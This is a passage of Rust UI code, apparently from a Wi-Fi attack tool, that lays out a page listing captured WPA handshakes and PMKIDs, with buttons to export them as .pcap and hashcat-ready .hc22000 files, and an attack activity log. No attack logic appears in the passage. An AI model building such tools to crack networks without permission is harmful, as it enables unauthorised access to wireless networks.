                    .child(
                        "SAE-only AP — no offline-crackable handshake or PMKID \
                         (WPA3 transition APs with PSK AKM are fine)",
                    ),
            )
        })
        .child(actions)
        .children(progress_cards)
        .children(stations_block)
        .child(gpuikit::elements::separator::separator())
        .child(
            h_stack()
                .items_center()
                .gap_3()
                .child(h3("Captures"))
                .child(small(format!(
                    "{} handshakes · {} PMKIDs",
                    app.state.handshakes.len(),
                    app.state.pmkids.len()
                )))
                .child(div().flex_1())
                .child(
                    button("btn-export-pcap", "Export .pcap").on_click({
                        let view = view.clone();
                        move |_, window, cx| export_pcap(&view, window, cx)
                    }),
                )
                .child(
                    button("btn-export", "Export .hc22000").on_click({
                        let view = view.clone();
                        move |_, window, cx| export_hc22000(&view, window, cx)
                    }),
                ),
        );

    let cards: Vec<gpui::AnyElement> = app
        .state
        .handshakes
        .iter()
        .map(|hs| handshake_card(hs, true).into_any_element())
        .chain(app.state.pmkids.iter().map(|pm| pmkid_card(pm).into_any_element()))
        .collect();
    if cards.is_empty() {
        page = page.child(small("nothing captured yet — run an attack"));
    } else {
        page = page.child(v_stack().gap_2().children(cards));
    }

    page = page
        .child(gpuikit::elements::separator::separator())
        .child(h3("Activity")).child(if activity.is_empty() {
            small("nothing yet — attack output appears here (full history on the Log page)")
                .into_any_element()
        } else {
            v_stack()
                .gap_1()
                .p_2()
                .rounded_md()
                .bg(theme.surface())
                .children(activity.iter().map(|line| {
                    div()
                        .text_xs()
                        .text_color(theme.fg_muted())
                        .child(line.clone())
                        .into_any_element()
                }))
                .into_any_element()
        });

    page.text_color(theme.fg())
}
